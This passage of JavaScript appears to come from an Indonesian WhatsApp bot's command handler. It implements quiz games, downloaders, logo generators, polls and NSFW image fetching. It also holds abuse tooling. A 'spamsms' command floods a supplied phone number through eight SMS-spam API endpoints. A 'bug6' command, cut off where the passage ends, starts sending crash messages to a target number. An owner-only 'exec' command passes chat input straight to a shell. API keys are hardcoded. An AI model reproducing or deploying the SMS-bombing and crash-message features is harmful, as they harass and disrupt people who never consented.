Timeout *${(timeout / 1000).toFixed(2)} second*
Bonus coin : *${arya.toLocaleString()}*
`.trim()
conn.siapakahaku[id] = [
await setReply(caption),
json,
setTimeout(() => {
if (conn.siapakahaku[id]) setReply(`*Waktu game habis!*\n\nJawabannya adalah => *${json.jawaban}*`)
delete conn.siapakahaku[id]
 }, timeout)
 ]
}
gameAdd(senderNumber, user)
break
case 'tebakgambar':{
if (!isGroup) return setReply('Kusus group')
if (isGame < 1) return setReply(`Limit game kamu sudah habis kirim perintah ${prefix}limit untuk mengecek`)
reply(`◦ Limit game telah digunakan tersisa\n╰► *${cekGLimit(senderNumber, gcount, user)}*`)	
let arya = randomNomor(math(10))
let timeout = 120000
let id = m.chat
if (id in conn.tebakgambar) return reply('Masih ada soal belum terjawab di chat ini')
let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')).json()
let json = src[Math.floor(Math.random() * src.length)]
let kentir = await getBuffer(json)       
let teks = `🎮 *Game Tebak Gambar* 🎮

*Soal :* ${json.deskripsi}

Timeout *${(timeout / 1000).toFixed(2)} second*
Bonus coin : *${arya.toLocaleString()}*
`.trim()
conn.tebakgambar[id] = [
xdev.sendImage(from, json.img , teks, dev),
json,
setTimeout(() => {
if (conn.tebakgambar[id]) setReply(`*Waktu game habis!*\n\nJawabannya adalah => *${json.jawaban}*`)
delete conn.tebakgambar[id]
 }, timeout)
 ]
}
gameAdd(senderNumber, user)
break
case 'tebakbendera':{
if (!isGroup) return setReply('Kusus group')
if (isGame < 1) return setReply(`Limit game kamu sudah habis kirim perintah ${prefix}limit untuk mengecek`)
reply(`◦ Limit game telah digunakan tersisa\n╰► *${cekGLimit(senderNumber, gcount, user)}*`)
let arya = randomNomor(math(10))
let timeout = 120000
let id = m.chat
if (id in conn.tebakbendera) return reply('Masih ada soal belum terjawab di chat ini')
let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera.json')).json()
let json = src[Math.floor(Math.random() * src.length)]
let teks = `🎮 *Game Tebak Bendera* 🎮

Bendera Apakah ini ?

Timeout *${(timeout / 1000).toFixed(2)} second*
Bonus coin : *${arya.toLocaleString()}*
`.trim()
conn.tebakbendera[id] = [
xdev.sendImage(from, json.img , teks, dev),
json,
setTimeout(() => {
if (conn.tebakbendera[id]) setReply(`*Waktu game habis!*\n\nJawabannya adalah => *${json.name}*`)
delete conn.tebakbendera[id]
 }, timeout)
 ]
}
gameAdd(senderNumber, user)
break
case 'tebaklirik':{
if (!isGroup) return setReply('Kusus group')
if (isGame < 1) return setReply(`Limit game kamu sudah habis kirim perintah ${prefix}limit untuk mengecek`)
reply(`◦ Limit game telah digunakan tersisa\n╰► *${cekGLimit(senderNumber, gcount, user)}*`)
let arya = randomNomor(math(10))
let timeout = 120000
let id = m.chat
if (id in conn.tebaklirik) return reply('Masih ada soal belum terjawab di chat ini')
let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')).json()
let json = src[Math.floor(Math.random() * src.length)]
let caption = `🎮 *Game Tebak Lirik* 🎮

*Soal :* ${json.soal}

Timeout *${(timeout / 1000).toFixed(2)} second*
Bonus coin : *${arya.toLocaleString()}*
`.trim()
conn.tebaklirik[id] = [
await setReply(caption),
json,
setTimeout(() => {
if (conn.tebaklirik[id]) setReply(`*Waktu game habis!*\n\nJawabannya adalah => *${json.jawaban}*`)
delete conn.tebaklirik[id]
 }, timeout)
 ]
}
gameAdd(senderNumber, user)		
break
case 'tekateki':{
if (isGame < 1) return setReply(`Limit game kamu sudah habis kirim perintah ${prefix}limit untuk mengecek`)
reply(`◦ Limit game telah digunakan tersisa\n╰► *${cekGLimit(senderNumber, gcount, user)}*`)	
if (!isGroup) return setReply('Kusus group')
let arya = randomNomor(math(10))
let timeout = 120000
let id = m.chat
if (id in conn.tekateki) return reply('Masih ada soal belum terjawab di chat ini')
let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tekateki.json')).json()
let json = src[Math.floor(Math.random() * src.length)]
let caption = `🎮 *Game Teka Teki* 🎮

*Soal :* ${json.soal}

Timeout *${(timeout / 1000).toFixed(2)} second*
Bonus coin : *${arya.toLocaleString()}*
`.trim()
conn.tekateki[id] = [
await setReply(caption),
json,
setTimeout(() => {
if (conn.tekateki[id]) setReply(`*Waktu game habis!*\n\nJawabannya adalah => *${json.jawaban}*`)
delete conn.tekateki[id]
 }, timeout)
 ]
}
gameAdd(senderNumber, user)		
break
case 'tebaktebakan':{
if (!isGroup) return setReply('Kusus group')
if (isGame < 1) return setReply(`Limit game kamu sudah habis kirim perintah ${prefix}limit untuk mengecek`)
reply(`◦ Limit game telah digunakan tersisa\n╰► *${cekGLimit(senderNumber, gcount, user)}*`)
let arya = randomNomor(math(10))
let timeout = 120000
let id = m.chat
if (id in conn.tebaktebakan) return reply('Masih ada soal belum terjawab di chat ini')
let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaktebakan.json')).json()
let json = src[Math.floor(Math.random() * src.length)]
let caption = `🎮 *Game Tebak Tebakan* 🎮

*Soal :* ${json.soal}

Timeout *${(timeout / 1000).toFixed(2)} second*
Bonus coin : *${arya.toLocaleString()}*
`.trim()
conn.tebaktebakan[id] = [
await setReply(caption),
json,
setTimeout(() => {
if (conn.tebaktebakan[id]) setReply(`*Waktu game habis!*\n\nJawabannya adalah => *${json.jawaban}*`)
delete conn.tebaktebakan[id]
 }, timeout)
 ]
}
gameAdd(senderNumber, user)		
break
case 'tebakkabupaten':{
if (!isGroup) return setReply('Kusus group')
if (isGame < 1) return setReply(`Limit game kamu sudah habis kirim perintah ${prefix}limit untuk mengecek`)
reply(`◦ Limit game telah digunakan tersisa\n╰► *${cekGLimit(senderNumber, gcount, user)}*`)
let arya = randomNomor(math(10))
let timeout = 120000
let id = m.chat
if (id in conn.tebakkabupaten) return reply('Masih ada soal belum terjawab di chat ini')
let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkabupaten.json')).json()
let json = src[Math.floor(Math.random() * src.length)]
let caption = `🎮 *Game Tebak Kabupaten* 🎮

Kabupaten Apakah Ini ?

Timeout *${(timeout / 1000).toFixed(2)} second*
Bonus coin : *${arya.toLocaleString()}*
`.trim()
conn.tebakkabupaten[id] = [
xdev.sendImage(from, json.url , caption, dev),
json,
setTimeout(() => {
if (conn.tebakkabupaten[id]) setReply(`*Waktu game habis!*\n\nJawabannya adalah => *${json.title}*`)
delete conn.tebakkabupaten[id]
 }, timeout)
 ]
}
gameAdd(senderNumber, user)		
break		
case 'asahotak':{
if (!isGroup) return setReply('Kusus group')
if (isGame < 1) return setReply(`Limit game kamu sudah habis kirim perintah ${prefix}limit untuk mengecek`)
reply(`◦ Limit game telah digunakan tersisa\n╰► *${cekGLimit(senderNumber, gcount, user)}*`)
let arya = randomNomor(math(10))
let timeout = 120000
let id = m.chat
if (id in conn.asahotak) return reply('Masih ada soal belum terjawab di chat ini')
let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/asahotak.json')).json()
let json = src[Math.floor(Math.random() * src.length)]
let caption = `🎮 *Game Asah Otak* 🎮

*Soal :* ${json.soal}

Timeout *${(timeout / 1000).toFixed(2)} second*
Bonus coin : *${arya.toLocaleString()}*
`.trim()
conn.asahotak[id] = [
await setReply(caption),
json,
setTimeout(() => {
if (conn.asahotak[id]) setReply(`*Waktu game habis!*\n\nJawabannya adalah => *${json.jawaban}*`)
delete conn.asahotak[id]
 }, timeout)
 ]
}
gameAdd(senderNumber, user)		
break
case 'tebakkimia':{
if (!isGroup) return setReply('Kusus group')
if (isGame < 1) return setReply(`Limit game kamu sudah habis kirim perintah ${prefix}limit untuk mengecek`)
reply(`◦ Limit game telah digunakan tersisa\n╰► *${cekGLimit(senderNumber, gcount, user)}*`)
let arya = randomNomor(math(10))
let timeout = 120000
let id = m.chat
if (id in conn.tebakkimia) return reply('Masih ada soal belum terjawab di chat ini')
let res = await fetch('https://anabotofc.herokuapp.com/api/kuis/tebakkimia?apikey=AnaBot')
let json = await res.json()
let caption = `🎮 *Game Tebak Kimia* 🎮

*Soal :* ${json.soal}

Timeout *${(timeout / 1000).toFixed(2)} second*
Bonus coin : *${arya.toLocaleString()}*
`.trim()
conn.tebakkimia[id] = [
await setReply(caption),
json,
setTimeout(() => {
if (conn.tebakkimia[id]) setReply(`*Waktu game habis!*\n\nJawabannya adalah => *${json.jawaban}*`)
delete conn.tebakkimia[id]
 }, timeout)
 ]
}
gameAdd(senderNumber, user)		
break

case 'afk':{
if (!isGroup) return setReply(mess.only.Group)
if (isBanchat) return 
if (cekAfk(from, sender)) return setReply('Kamu sedang afk')                        
addAfk(from, pushname, sender)
setReply(`Kamu telah afk`)
}
break

  
		
//================================================================================\\

case  'sfile': {
	async function sfileSearch(query, page = 1) {
	let res = await fetch(`https://sfile.mobi/search.php?q=${query}&page=${page}`)
	let $ = cheerio.load(await res.text())
	let result = []
	$('div.list').each(function () {
		let title = $(this).find('a').text()
		let size = $(this).text().trim().split('(')[1]
		let link = $(this).find('a').attr('href')
		if (link) result.push({ title, size: size.replace(')', ''), link })
	})
	return result
}

async function sfileDl(url) {
	let res = await fetch(url)
	let $ = cheerio.load(await res.text())
	let filename = $('div.w3-row-padding').find('img').attr('alt')
	let mimetype = $('div.list').text().split(' - ')[1].split('\n')[0]
	let filesize = $('#download').text().replace(/Download File/g, '').replace(/\(|\)/g, '').trim()
	let download = $('#download').attr('href') + '&k=' + Math.floor(Math.random() * (15 - 10 + 1) + 10)
	return { filename, filesize, mimetype, download }
}
	
	if (q.match(/(https:\/\/sfile.mobi\/)/gi)) {
		let res = await sfileDl(q)
		if (!res) return setReply('Error :/')
		await setReply(Object.keys(res).map(v => `*• ${v}:* ${res[v]}`).join('\n') + '\n\n_Sending file..._')
		conn.sendMessage(m.chat, { document: { url: res.download }, fileName: res.filename, mimetype: res.mimetype }, { quoted: m })
	} else if (q) {
		let [query, page] = q.split`|`
		let res = await sfileSearch(query, page)
		if (!res.length) return setReply( `Query "${text}" not found :/`)
		rus = res.map((v) => `*Title:* ${v.title}\n*Size:* ${v.size}\n*Link:* ${v.link}`).join`\n\n`
		setReply(rus)
	} else return setReply( 'Input Query / Sfile Url!')
}
break
    
case 'neon':
case 'greenneon':
case 'futureneon':
case 'sandwriting':
case 'sandsummer':
case 'sandengraved':
case 'metaldark':
case 'neonlight':
case 'holograph':
case 'text1917':
case 'minion':
case 'deluxesilver':
case 'newyearcard':
case 'bloodfrosted':
case 'halloween':
case 'jokerlogo':
case 'fireworksparkle':
case 'bokeh':
case 'toxic':
case 'strawberry':
case 'box3d':
case 'roadwarning':
case 'breakwall':
case 'icecold':
case 'luxury':
case 'cloud':
case 'summersand':
case 'horrorblood':
case 'thunder':
case 'magma':
case 'impressiveglitch':
case 'watercolor':
case 'wonderfulgraffiti':
try{
{
if (!q) return setReply('Text?') 
{let kon = await xdev.sendMessage(from, { text: mess.wait }, { quoted: m })
}
let result = await getBuffer(`https://api.lolhuman.xyz/api/textprome/${command}?apikey=${lolkey}&text=${q}`)
let teks = 'Nih'
await xdev.sendMessage(from, { image: result, caption: teks, footer: fake }, {quoted: setQuoted})
}
}  catch (err) {
console.log(err)
setReply('Fitur sedang error kak coba lain waktu ya')
}
break

case 'pornhub':
case 'avenger':
case 'space':
case 'ninjalogo':
case 'marvelstudio':
case 'lionlogo':
case 'wolflogo':
case 'steel3d':
case 'wallgravity':
case 'coolgravity':
try{ 
if (!q) return setReply(`Penggunaan\n ${prefix + command} My Self`) 
{let kon = await xdev.sendMessage(from, { text: mess.wait }, { quoted: m })
}
{let result = await getBuffer(`https://api.lolhuman.xyz/api/textprome2/${command}?apikey=${lolkey}&text1=${args[0]}&text2=${args[1]}`)
let teks = 'Nih'
await xdev.sendMessage(from, { image: result, caption: teks, footer: fake }, {quoted: setQuoted})
} } catch (err) {
console.log(err)
setReply('Fitur sedang error kak coba lain waktu ya')
}
break
  
case 'hentai':
case 'ahegao':
case 'hololewd':
case 'sideoppai':
case 'animefeets':
case 'animebooty':
case 'animethighss':
case 'hentaiparadise':
case 'animearmpits':
case 'hentaifemdom':
case 'lewdanimegirls':
case 'biganimetiddies':
case 'animebellybutton':
case 'hentai4everyone':{
if (!isGroup) return setReply(mess.only.group)
let buffer = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${lolkey}`)   
let buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `Next photo`},type:1}]                            
xdev.sendMessage(from, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `${week} , ${calender}ㅤㅤㅤㅤㅤㅤㅤㅤㅤ`,body:`⌜ ${ucapanWaktu} ⌟`,previewType:"PHOTO",thumbnail: fs.readFileSync(`./stik/reply.jpg`),sourceUrl: `https://tinyurl.com/2p7fks3c`,}
}, image: buffer, caption: `[ SUCCES ]`, buttons: buttons ,footer: `Hasil pencarian dari ${command}`}, { quoted: dev }).catch((err) => reply('Maaf error coba lagi atau api nya mungkin!'))
}
break  
  
case 'akinator':
if (isGroup) return setReply('tidak bisa di gunakan didalam group. private chat only!!')
if (!q.split('|')[0] && !q.split('|')[1] && !q.split('|')[2] && !q.split('|')[3] && !q.split('|')[4] && !q.split('|')[5]) {
require('../lib/akinatorStart')(Araa, m, prefix, command, from, fake, fetchJson, setReply)
} else if (q.split('|')[0] && q.split('|')[1] && q.split('|')[2] && q.split('|')[3] && q.split('|')[4] && q.split('|')[5] !== '5') {
require('../lib/akinatorAnswer')(Araa, m, q, prefix, command, from, fake, fetchJson, setReply)
} else if (q.split('|')[0] && q.split('|')[1] && q.split('|')[2] && q.split('|')[3] && q.split('|')[4] && q.split('|')[5] == '5') {
require('../lib/akinatorBack')(Araa, m, q, prefix, command, from, fake, fetchJson, setReply)
}
break

case  'spamsms':
                    if (args.length == 0) return reply(`Example: ${prefix + command} 08303030303030`)
                    nomor = args[0]
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam1?apikey=AZZAM&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam2?apikey=AZZAM&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam3?apikey=AZZAM&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam4?apikey=AZZAM&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam5?apikey=AZZAM&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam6?apikey=AZZAM&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam7?apikey=AZZAM&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam8?apikey=AZZAM&nomor=${nomor}`)
                    reply("Success")
                    break

case 'zippy':
case 'zippyshare':
let { extract } = require( 'zs-extract')
let { lookup } =  require( 'mime-types')
  if (!args[0]) return setReply(`Masukkan URL zippyshare yang ingin didownload.\n\nContoh: ${prefix + command} https://www83.zippyshare.com/v/wD7mX1i0/file.html`)
  if (!args[0].includes('zippyshare.com')) return setReppy( 'Invalid URL!\nPastikan URL merupakan URL zippyshare.')
  setReply(mess.wait)
  for (let i = 0; i < args.length; i++) {
    if (!args[i].includes('zippyshare.com/v')) continue
    let res = await extract(args[i])
    let mimetype = await lookup(res.download)
    conn.sendMessage(m.chat, { document: { url: res.download }, fileName: res.filename, mimetype }, { quoted: m })
  }
break

case 'anonfile':{
const anonfile = require('anonfile-lib')
//if (!isAllMedia) return setReply( `Kirim File yang ingin diunggah dan reply medianya dengan perintah ${prefix}${command}`)
let filename = q ? q : 'AnonFiles-'+Math.floor(Math.random() * 999999999)
let media = await conn.downloadAndSaveMediaMessage(quoted, filename)
    //await fs.writeFileSync(`./tmp/${filename}`, media)
let info = await anonfile.upload(media)
if(info.status !== true) setReply( `GAGAL`)
let response = `───「 ANONFILES UPLOADER 」───
Sukses Mengunggah File

Nama File : ${info.data.file.metadata.name}
Ukuran File : ${info.data.file.metadata.size.readable}
Link : ${info.data.file.url.full}
Short : ${info.data.file.url.short}
`
 await setReply(response)
 await  fs.unlinkSync(media)
 }
 break

case "manga-search":
const { Manga } = require("@shineiichijo/marika");
const manga = new Manga();
if (!q) return reply("Which manga do you want to search My Lord");
let srh = await manga.searchManga(q);
let mang = `🎀Title: ${srh.data[0].title}\n`;
mang += `📈Status: ${srh.data[0].status}\n`;
mang += `🌸Total Volumes: ${srh.data[0].volumes}\n`;
mang += `🎗Total Chapters: ${srh.data[0].chapters}\n`;
mang += `🧧Genres:\n`;
for (let i = 0; i < srh.data[0].genres.length; i++) {
mang += `\t\t\t\t\t\t\t\t*${srh.data[0].genres[i].name}*\n`;
}
mang += `✨Published on: ${srh.data[0].published.from}\n`;
mang += `🌟Score: ${srh.data[0].scored}\n`;
mang += `🎐Popularity: ${srh.data[0].popularity}\n`;
mang += `🎏Favorites: ${srh.data[0].favorites}\n`;
mang += `✍Authors:\n`;
for (let i = 0; i < srh.data[0].authors.length; i++) {
mang += `\t\t\t\t\t\t\t\t\t*${srh.data[0].authors[i].name}* (${srh.data[0].authors[0].type})\n`;
}
mang += `\n*🌐URL: ${srh.data[0].url}*\n\n`;
if (srh.data[0].background !== null) mang += `🎆Background: ${srh.data[0].background}`;
mang += `❄️Description: ${srh.data[0].synopsis.replace(
          /\[Written by Sam]/g,
          ""
        )}`;
        xdev.sendMessage(
          m.chat,
          {
            image: {
              url: srh.data[0].images.jpg.large_image_url,
            },
            caption: mang,
          },
          {
            quoted: m,
          }
        );
         break;

case 'playstore':
                    if (args.length == 0) return reply(`Example: ${prefix + command} telegram`)
                    var { data } = axios.get(`https://api.lolhuman.xyz/api/playstore?apikey=AZZAM&query=${q}`).then(({ data }) => {
                     var caption = 'Play Store Search : \n'
                    for (var x of data.result) {
                        caption += `Name : ${x.title}\n`
                        caption += `ID : ${x.appId}\n`
                        caption += `Developer : ${x.developer}\n`
                        caption += `Link : ${x.url}\n`
                        caption += `Price : ${x.priceText}\n`
                        caption += `Price : ${x.price}\n\n`
                    reply(caption)
                    }
                })
                    break
                      
case 'joox':
            if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
            axios.get(`https://api.lolhuman.xyz/api/jooxplay?apikey=${lolkey}&query=${q}`).then(({ data }) => {
                var caption = `Title : ${data.result.info.song}\n`
                caption += `Artists : ${data.result.info.singer}\n`
                caption += `Duration : ${data.result.info.duration}\n`
                caption += `Album : ${data.result.info.album}\n`
                caption += `Uploaded : ${data.result.info.date}\n`
                caption += `Lirik :\n ${data.result.lirik}\n`
                 xdev.sendMessage(from, { image: { url: data.result.image }, caption }).then(() => {
                     xdev.sendMessage(from, { audio: { url: data.result.audio[0].link }, mimetype: 'audio/mp4', fileName: `${data.result.title}.mp3`, ptt: true })
                })
            })
            break

case 'disappearing':
    case 'pesansementara':
if (!isGroup) return setReply(mess.only.Group)
if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
if (!isGroupAdmins && !isOwner) return setReply(mess.only.Admin)
if (q == 'off') {
Araa.sendMessage(from, { disappearingMessagesInChat: 0 })
} else if (q == '24 hours') {
Araa.sendMessage(from, { disappearingMessagesInChat: 86400 })
} else if (q == '7 days') {
Araa.sendMessage(from, { disappearingMessagesInChat: 604800 })
} else if (q == '90 days') {
Araa.sendMessage(from, { disappearingMessagesInChat: 7776000 })
} else if (Araa.sendMessage(from, { disappearingMessagesInChat: 0 })) {
const sections = [ {
title: `PLEASE SELECT`,
rows: [
{title: '24 HOURS', rowId: `${prefix + command} 24 hours`},
{title: '7 DAYS', rowId: `${prefix + command} 7 days`},
{title: '90 DAYS', rowId: `${prefix + command} 90 days`},
]}]
const listMessage = { text: `MESSAGE TIMER`, footer: copyright, buttonText: "Click Here", sections }
Araa.sendMessage(from, listMessage, { quoted: m })
} else if (Araa.sendMessage(from, { disappearingMessagesInChat: 86400 })) {
const sections = [ {
title: `PLEASE SELECT`,
rows: [
{title: 'OFF', rowId: `${prefix + command} off`},
{title: '7 DAYS', rowId: `${prefix + command} 7 days`},
{title: '90 DAYS', rowId: `${prefix + command} 90 days`},
]}]
const listMessage = { text: `MESSAGE TIMER`, footer: copyright, buttonText: "Click Here", sections }
Araa.sendMessage(from, listMessage, { quoted: m })
} else if (Araa.sendMessage(from, { disappearingMessagesInChat: 604800 })) {
const sections = [ {
title: `PLEASE SELECT`,
rows: [
{title: 'OFF', rowId: `${prefix + command} off`},
{title: '24 HOURS', rowId: `${prefix + command} 24 hours`},
{title: '90 DAYS', rowId: `${prefix + command} 90 days`},
]}]
const listMessage = { text: `MESSAGE TIMER`, footer: copyright, buttonText: "Click Here", sections }
Araa.sendMessage(from, listMessage, { quoted: m })
} else if (Araa.sendMessage(from, { disappearingMessagesInChat: 7776000 })) {
const sections = [ {
title: `PLEASE SELECT`,
rows: [
{title: 'OFF', rowId: `${prefix + command} off`},
{title: '24 HOURS', rowId: `${prefix + command} 24 hours`},
{title: '7 DAYS', rowId: `${prefix + command} 7 days`},
]}]
const listMessage = { text: `MESSAGE TIMER`, footer: copyright, buttonText: "Click Here", sections }
Araa.sendMessage(from, listMessage, { quoted: m })
}
break  

case 'vote':{
if (!q) return setReply('Example : ${prefix + command} Bikin apa uy?|kentang goreng|nasi goreng')
if (q.split('|')[0] && q.split('|')[1] && q.split('|')[2] && q.split('|')[3] && q.split('|')[4] && q.split('|')[5] && q.split('|')[6] && q.split('|')[7] && q.split('|')[8] && q.split('|')[9] && q.split('|')[10]) {
let listPoll = [{ optionName: q.split('|')[1] },{ optionName: q.split('|')[2] },{ optionName: q.split('|')[3] },{ optionName: q.split('|')[4] },{ optionName: q.split('|')[5] },{ optionName: q.split('|')[6] },{ optionName: q.split('|')[7] },{ optionName: q.split('|')[8] },{ optionName: q.split('|')[9] },{ optionName: q.split('|')[10] }] 
Araa.sendPoll(from, q.split('|')[0], listPoll)
} else if (q.split('|')[0] && q.split('|')[1] && q.split('|')[2] && q.split('|')[3] && q.split('|')[4] && q.split('|')[5] && q.split('|')[6] && q.split('|')[7] && q.split('|')[8] && q.split('|')[9] && !q.split('|')[10]) {
let listPoll = [{ optionName: q.split('|')[1] },{ optionName: q.split('|')[2] },{ optionName: q.split('|')[3] },{ optionName: q.split('|')[4] },{ optionName: q.split('|')[5] },{ optionName: q.split('|')[6] },{ optionName: q.split('|')[7] },{ optionName: q.split('|')[8] },{ optionName: q.split('|')[9] }] 
Araa.sendPoll(from, q.split('|')[0], listPoll)
} else if (q.split('|')[0] && q.split('|')[1] && q.split('|')[2] && q.split('|')[3] && q.split('|')[4] && q.split('|')[5] && q.split('|')[6] && q.split('|')[7] && q.split('|')[8] && !q.split('|')[9] && !q.split('|')[10]) {
let listPoll = [{ optionName: q.split('|')[1] },{ optionName: q.split('|')[2] },{ optionName: q.split('|')[3] },{ optionName: q.split('|')[4] },{ optionName: q.split('|')[5] },{ optionName: q.split('|')[6] },{ optionName: q.split('|')[7] },{ optionName: q.split('|')[8] }] 
Araa.sendPoll(from, q.split('|')[0], listPoll)
} else if (q.split('|')[0] && q.split('|')[1] && q.split('|')[2] && q.split('|')[3] && q.split('|')[4] && q.split('|')[5] && q.split('|')[6] && q.split('|')[7] && !q.split('|')[8] && !q.split('|')[9] && !q.split('|')[10]) {
let listPoll = [{ optionName: q.split('|')[1] },{ optionName: q.split('|')[2] },{ optionName: q.split('|')[3] },{ optionName: q.split('|')[4] },{ optionName: q.split('|')[5] },{ optionName: q.split('|')[6] },{ optionName: q.split('|')[7] }] 
Araa.sendPoll(from, q.split('|')[0], listPoll)
} else if (q.split('|')[0] && q.split('|')[1] && q.split('|')[2] && q.split('|')[3] && q.split('|')[4] && q.split('|')[5] && q.split('|')[6] && !q.split('|')[7] && !q.split('|')[8] && !q.split('|')[9] && !q.split('|')[10]) {
let listPoll = [{ optionName: q.split('|')[1] },{ optionName: q.split('|')[2] },{ optionName: q.split('|')[3] },{ optionName: q.split('|')[4] },{ optionName: q.split('|')[5] },{ optionName: q.split('|')[6] }] 
Araa.sendPoll(from, q.split('|')[0], listPoll)
} else if (q.split('|')[0] && q.split('|')[1] && q.split('|')[2] && q.split('|')[3] && q.split('|')[4] && q.split('|')[5] && !q.split('|')[6] && !q.split('|')[7] && !q.split('|')[8] && !q.split('|')[9] && !q.split('|')[10]) {
let listPoll = [{ optionName: q.split('|')[1] },{ optionName: q.split('|')[2] },{ optionName: q.split('|')[3] },{ optionName: q.split('|')[4] },{ optionName: q.split('|')[5] }] 
Araa.sendPoll(from, q.split('|')[0], listPoll)
} else if (q.split('|')[0] && q.split('|')[1] && q.split('|')[2] && q.split('|')[3] && q.split('|')[4] && !q.split('|')[5] && !q.split('|')[6] && !q.split('|')[7] && !q.split('|')[8] && !q.split('|')[9] && !q.split('|')[10]) {
let listPoll = [{ optionName: q.split('|')[1] },{ optionName: q.split('|')[2] },{ optionName: q.split('|')[3] },{ optionName: q.split('|')[4] }] 
Araa.sendPoll(from, q.split('|')[0], listPoll)
} else if (q.split('|')[0] && q.split('|')[1] && q.split('|')[2] && q.split('|')[3] && !q.split('|')[4] && !q.split('|')[5] && !q.split('|')[6] && !q.split('|')[7] && !q.split('|')[8] && !q.split('|')[9] && !q.split('|')[10]) {
let listPoll = [{ optionName: q.split('|')[1] },{ optionName: q.split('|')[2] },{ optionName: q.split('|')[3] }] 
Araa.sendPoll(from, q.split('|')[0], listPoll)
} else if (q.split('|')[0] && q.split('|')[1] && q.split('|')[2] && !q.split('|')[3] && !q.split('|')[4] && !q.split('|')[5] && !q.split('|')[6] && !q.split('|')[7] && !q.split('|')[8] && !q.split('|')[9] && !q.split('|')[10]) {
let listPoll = [{ optionName: q.split('|')[1] },{ optionName: q.split('|')[2] }] 
Araa.sendPoll(from, q.split('|')[0], listPoll)
} else if (q.split('|')[0] && q.split('|')[1] && !q.split('|')[2] && !q.split('|')[3] && !q.split('|')[4] && !q.split('|')[5] && !q.split('|')[6] && !q.split('|')[7] && !q.split('|')[8] && !q.split('|')[9] && !q.split('|')[10]) {
let listPoll = [{ optionName: q.split('|')[1] }] 
Araa.sendPoll(from, q.split('|')[0], listPoll)
}
}
break

case  'listversion':{
if (!itsMe && !isOwner) return onlyOwner()
exec(q, async (err, stdout) => {
if (err) return setReply(`${copyright}:~ ${err}`)
let listSerch = []

    let teskd = `\nSilakan pilih versi module yang ingin di install\n`
  let module = q.split('view')[1].replace(" versions",'').replace(' --json','').replace(' ','')

  let yaya = JSON.parse(stdout)
  
 // Log(yaya)
    for (let i of yaya) {

    listSerch.push({
    title: module,
    rowId: `${prefix}$ npm i ${module}@${i}`,
    description: `🔖 V${i}`
    })
    }
  
  if(module.includes("@adiwajshing/baileys")){
    listSerch.push({
    title: module,
    rowId: `${prefix}$ npm i ${module}@https://github.com/officialdittaz/BaileysFix`,
    description: `🔖 github:officialdittaz/BaileysFix`
    },{
    title: module,
    rowId: `${prefix}$ npm i ${module}@https://github.com/amiruldev20/baileys`,
    description: `🔖 github:amiruldev20/baileys`
    })
    
  }
    const sections = [
    {
    title: "Total Version " + yaya.length,
    rows: listSerch
    }
    ]
    const listMessage = {
    text: teskd,
    footer: copyright,
    title: `*List Version*`,
    buttonText: "TAP",
    sections
    }
    conn.sendMessage(from, listMessage, {quoted: m})

})
}
break

case  'update': {
const lala = JSON.parse(fs.readFileSync('./package.json'))
 
let listSerch = []
let listmodule = Object.keys(lala.dependencies)
    let nono = Object.entries(lala.dependencies)
    let teskd = `\nResult From *Package.json*\n\n*Select any module*`
    for (let i of nono) {
    listSerch.push({
    title: i[0],
    rowId: `${prefix}listversion npm view ${i[0]} versions --json`,
    description: `${i[1]}`
    })
    }
    const sections = [
    {
    title: "Total Module " + listmodule.length,
    rows: listSerch
    }
    ]
    const listMessage = {
    text: teskd,
    footer: copyright,
    title: `*Update Dependencies*`,
    buttonText: "FOUND",
    sections
    }
    conn.sendMessage(from, listMessage, {quoted: m})
    }
    break

    case  'outdate':{
if (!itsMe && !isOwner) return onlyOwner()
exec("npm outdate --json", async (err, stdout) => {
if (err) return setReply(`${copyright}:~ ${err}`)
let listSerch = []
let teskd = `\n Berikut adalah module yang belom di update\n`
let yaya = JSON.parse(stdout)
let nana = Object.keys(yaya)
let nono = Object.entries(yaya)
for (let i of nana) {
listSerch.push({
title: i,
rowId: `${prefix}exec npm i ${i}@${yaya[i].latest}`,
description: `🔖 V${yaya[i].latest}`
 })
}
const sections = [
{
title: "Total Version " + nana.length,
rows: listSerch
}
]
const listMessage = {
text: teskd,
footer: copyright,
title: `*List Version*`,
buttonText: "TAP",
sections
}
conn.sendMessage(from, listMessage, {quoted: m})
})
}
break

case  'exec':{
	if (!itsMe && !isOwner) return onlyOwner()
	await setReply("_Executing..._")
	exec(q, async (err, stdout) => {
	if (err) return setReply(`${copyright}:~ ${err}`)
	if (stdout) {
	await setReply(`${stdout}`)
	let teks = `Berhasil menginstall module ${q.replace("npm i","")}`
	let mok = [{"buttonId": `${prefix}restart`,"buttonText": {"displayText": `Restart`},"type": "RESPONSE"}]
	let tolol = {
	text: teks,
	footer: `${copyright}`,
	buttons: mok,
	headerType: 1
	}
	await conn.sendMessage(from, tolol , {quoted: dev})
	}
	})
	}
	break

case  'bug6':
try{
if(!isOwner) return onlyOwner()
let Pe = mentionByTag[0]? mentionByTag[0] : mentionByReply ? mentionByReply : q? numberQuery : false
console.log(Pe)
if(!Pe ) return setReply("Masukan nomer target")
if(Pe == Ownerin) return setReply("SendBug Gagal")
await setReply("Sending...")
	//await conn.sendKatalog(Pe, virtex8(prefix), virtex8(prefix), thumb, {quoted: setQuoted})
